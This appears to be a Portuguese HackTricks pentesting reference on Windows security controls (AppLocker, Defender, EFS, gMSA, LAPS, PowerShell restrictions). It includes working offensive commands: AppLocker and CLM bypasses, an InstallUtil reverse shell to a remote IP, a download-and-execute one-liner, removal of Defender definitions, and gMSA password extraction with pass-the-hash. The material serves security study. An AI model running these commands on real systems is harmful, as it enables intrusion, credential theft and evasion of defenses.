# Controles de Segurança do Windows

{{#include ../../banners/hacktricks-training.md}}

## Política do AppLocker

Uma whitelist de aplicações é uma lista de aplicativos ou executáveis aprovados que podem estar presentes e ser executados em um sistema. O objetivo é proteger o ambiente contra malware nocivo e software não aprovado que não esteja alinhado com as necessidades específicas de negócio de uma organização.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) é a Microsoft’s **application whitelisting solution** e dá aos administradores de sistema controle sobre **quais aplicações e arquivos os usuários podem executar**. Ele fornece **controle granular** sobre executáveis, scripts, arquivos de instalação do Windows, DLLs, packaged apps e packed app installers.\ 
É comum que organizações **bloqueiem cmd.exe e PowerShell.exe** e o acesso de escrita a certos diretórios, **mas tudo isso pode ser contornado**.

### Verificar

Verifique quais arquivos/extensões estão blacklisted/whitelisted:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Este caminho do registro contém as configurações e políticas aplicadas pelo AppLocker, fornecendo uma forma de revisar o conjunto atual de regras aplicadas no sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Pastas graváveis** úteis para contornar a política do AppLocker: se o AppLocker estiver permitindo executar qualquer coisa dentro de `C:\Windows\System32` ou `C:\Windows`, existem **pastas graváveis** que você pode usar para **contornar isso**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Binários comumente **confiáveis** [**"LOLBAS's"**](https://lolbas-project.github.io/) podem também ser úteis para contornar AppLocker.
- **Regras mal escritas também podem ser contornadas**
- Por exemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, você pode criar uma **pasta chamada `allowed`** em qualquer lugar e ela será permitida.
- Organizações frequentemente focam em **bloquear o executável `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mas esquecem das **outras** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) tais como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
- **DLL enforcement very rarely enabled** devido à carga adicional que pode causar no sistema e à quantidade de testes necessários para garantir que nada quebre. Portanto, usar **DLLs as backdoors** ajudará a contornar o AppLocker.
- Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o AppLocker. Para mais informações, confira: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

Credenciais locais estão presentes neste arquivo; as senhas estão em forma de hash.

### Local Security Authority (LSA) - LSASS

As **credenciais** (em hash) são **salvas** na **memória** deste subsistema por motivos de Single Sign-On.\
**LSA** administra a **política de segurança** local (política de senhas, permissões de usuários...), **autenticação**, **tokens de acesso**...\
O LSA será quem **verificará** as credenciais fornecidas dentro do arquivo **SAM** (para um login local) e **se comunicará** com o **controlador de domínio** para autenticar um usuário de domínio.

As **credenciais** são **salvas** dentro do processo **LSASS**: tickets Kerberos, hashes NT e LM, senhas facilmente descriptografadas.

### LSA secrets

O LSA pode salvar em disco algumas credenciais:

- Senha da conta de computador do Active Directory (controlador de domínio inacessível).
- Senhas das contas de serviços do Windows
- Senhas de tarefas agendadas
- Mais (senha de aplicações IIS...)

### NTDS.dit

É a base de dados do Active Directory. Está presente apenas em controladores de domínio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) é um antivírus disponível no Windows 10 e Windows 11, e em versões do Windows Server. Ele **bloqueia** ferramentas comuns de pentesting como **`WinPEAS`**. No entanto, existem maneiras de **contornar essas proteções**.

### Check

Para verificar o **status** do **Defender** você pode executar o cmdlet PS **`Get-MpComputerStatus`** (verifique o valor de **`RealTimeProtectionEnabled`** para saber se está ativo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerá-lo você também pode executar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Sistema de Arquivos Criptografado (EFS)

EFS protege arquivos por meio de criptografia, utilizando uma **chave simétrica** conhecida como **File Encryption Key (FEK)**. Essa chave é criptografada com a **chave pública** do usuário e armazenada no $EFS **alternative data stream** do arquivo criptografado. Quando a descriptografia é necessária, a **chave privada** correspondente ao certificado digital do usuário é usada para descriptografar o FEK a partir do stream $EFS. Mais detalhes podem ser encontrados [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Cenários de descriptografia sem ação do usuário** incluem:

- Quando arquivos ou pastas são movidos para um sistema de arquivos não-EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), eles são automaticamente descriptografados.
- Arquivos criptografados enviados pela rede via protocolo SMB/CIFS são descriptografados antes da transmissão.

Esse método de criptografia permite **acesso transparente** aos arquivos criptografados para o proprietário. No entanto, simplesmente alterar a senha do proprietário e efetuar login não permitirá a descriptografia.

Principais pontos:

- EFS usa um FEK simétrico, criptografado com a chave pública do usuário.
- A descriptografia emprega a chave privada do usuário para acessar o FEK.
- Descriptografia automática ocorre em condições específicas, como cópia para FAT32 ou transmissão pela rede.
- Arquivos criptografados são acessíveis ao proprietário sem passos adicionais.

### Verificar informações do EFS

Verifique se um **usuário** utilizou este **serviço** checando se este caminho existe:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Verifique **quem** tem **acesso** ao arquivo usando cipher /c \<file\>  
Você também pode usar `cipher /e` e `cipher /d` dentro de uma pasta para **encrypt** e **decrypt** todos os arquivos

### Descriptografando arquivos EFS

#### Assumindo o contexto do SYSTEM

Esse método requer que o **usuário-vítima** esteja **executando** um **processo** no host. Se for o caso, usando uma sessão `meterpreter` você pode personificar o token do processo do usuário (`impersonate_token` do `incognito`). Ou você pode simplesmente `migrate` para um processo do usuário.

#### Conhecendo a senha do usuário


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Contas de Serviço Gerenciadas em Grupo (gMSA)

A Microsoft desenvolveu as **Group Managed Service Accounts (gMSA)** para simplificar o gerenciamento de contas de serviço em infraestruturas de TI. Ao contrário das contas de serviço tradicionais que frequentemente têm a configuração "**Password never expire**" habilitada, as gMSAs oferecem uma solução mais segura e gerenciável:

- **Gerenciamento automático de senhas**: gMSAs usam uma senha complexa de 240 caracteres que muda automaticamente conforme a política do domínio ou do computador. Esse processo é gerenciado pelo Key Distribution Service (KDC) da Microsoft, eliminando a necessidade de alterações manuais de senha.
- **Segurança aprimorada**: Essas contas são imunes a lockouts e não podem ser usadas para logons interativos, aumentando sua segurança.
- **Suporte a múltiplos hosts**: gMSAs podem ser compartilhadas entre vários hosts, tornando-as ideais para serviços executados em múltiplos servidores.
- **Capacidade para Scheduled Tasks**: Ao contrário das managed service accounts, gMSAs suportam execução de tarefas agendadas.
- **Gerenciamento simplificado de SPN**: O sistema atualiza automaticamente o Service Principal Name (SPN) quando há mudanças nos detalhes sAMAccount do computador ou no nome DNS, simplificando o gerenciamento de SPNs.

As senhas das gMSAs são armazenadas na propriedade LDAP _**msDS-ManagedPassword**_ e são resetadas automaticamente a cada 30 dias pelos Domain Controllers (DCs). Essa senha, um blob de dados criptografado conhecido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), só pode ser recuperada por administradores autorizados e pelos servidores nos quais as gMSAs estão instaladas, garantindo um ambiente seguro. Para acessar essa informação, é necessária uma conexão segura como LDAPS, ou a conexão deve ser autenticada com 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Você pode ler esta senha com [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Além disso, confira esta [web page](https://cube0x0.github.io/Relaying-for-gMSA/) sobre como executar um **NTLM relay attack** para **ler** a **senha** do **gMSA**.

### Abusar do encadeamento de ACLs para ler a senha gerenciada de gMSA (GenericAll -> ReadGMSAPassword)

Em muitos ambientes, usuários pouco privilegiados podem pivotar para segredos de gMSA sem comprometer o DC, abusando de ACLs de objeto mal configuradas:

- Um grupo que você controla (por exemplo, via GenericAll/GenericWrite) recebe `ReadGMSAPassword` sobre um gMSA.
- Ao adicionar-se a esse grupo, você herda o direito de ler o blob `msDS-ManagedPassword` do gMSA via LDAP e derivar credenciais NTLM utilizáveis.

Fluxo de trabalho típico:

1) Descubra o caminho com BloodHound e marque seus foothold principals como Owned. Procure por arestas como:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Adicione-se ao grupo intermediário que você controla (exemplo com bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Leia a senha gerenciada gMSA via LDAP e derive o hash NTLM. NetExec automatiza a extração de `msDS-ManagedPassword` e a conversão para NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Autentique-se como o gMSA usando o hash NTLM (não é necessário plaintext). Se a conta estiver em Remote Management Users, o WinRM funcionará diretamente:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notas:
- LDAP reads of `msDS-ManagedPassword` require sealing (e.g., LDAPS/sign+seal). Tools handle this automatically.
- gMSAs are often granted local rights like WinRM; validate group membership (e.g., Remote Management Users) to plan lateral movement.
- If you only need the blob to compute the NTLM yourself, see MSDS-MANAGEDPASSWORD_BLOB structure.



## LAPS

A **Local Administrator Password Solution (LAPS)**, disponível para download em [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite o gerenciamento de senhas do administrador local. Essas senhas, que são **aleatórias**, únicas e **alteradas regularmente**, são armazenadas centralmente no Active Directory. O acesso a essas senhas é restrito por ACLs a usuários autorizados. Com permissões suficientes concedidas, é possível ler as senhas de admin local.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloqueia muitas das funcionalidades** necessárias para usar o PowerShell de forma eficaz, como bloquear COM objects, permitir apenas .NET types aprovados, XAML-based workflows, PowerShell classes, e mais.

### **Verificar**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Nas versões atuais do Windows esse Bypass não funciona, mas você pode usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilá-lo talvez seja necessário** **para** _**Adicionar uma Referência**_ -> _Procurar_ ->_Procurar_ -> adicionar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **alterar o projeto para .Net4.5**.

#### Bypass direto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e bypass o constrained mode. Para mais informações, veja: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Política de Execução do PS

Por padrão está definido como **restricted.** Principais formas de bypass desta política:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mais informações podem ser encontradas [aqui](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interface de Provedor de Suporte de Segurança (SSPI)

É a API que pode ser usada para autenticar usuários.

O SSPI será responsável por encontrar o protocolo adequado para duas máquinas que queiram se comunicar. O método preferido para isso é Kerberos. Em seguida, o SSPI negociará qual protocolo de autenticação será usado; esses protocolos de autenticação são chamados Provedor de Suporte de Segurança (SSP), estão localizados em cada máquina Windows na forma de uma DLL e ambas as máquinas devem suportar o mesmo para poderem se comunicar.

### Principais SSPs

- **Kerberos**: O preferido
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Razões de compatibilidade
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Servidores web e LDAP, senha na forma de um hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: É usado para negociar o protocolo a usar (Kerberos ou NTLM, sendo Kerberos o padrão)
- %windir%\Windows\System32\lsasrv.dll

#### A negociação pode oferecer vários métodos ou apenas um.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que habilita uma **solicitação de consentimento para atividades elevadas**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Referências

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
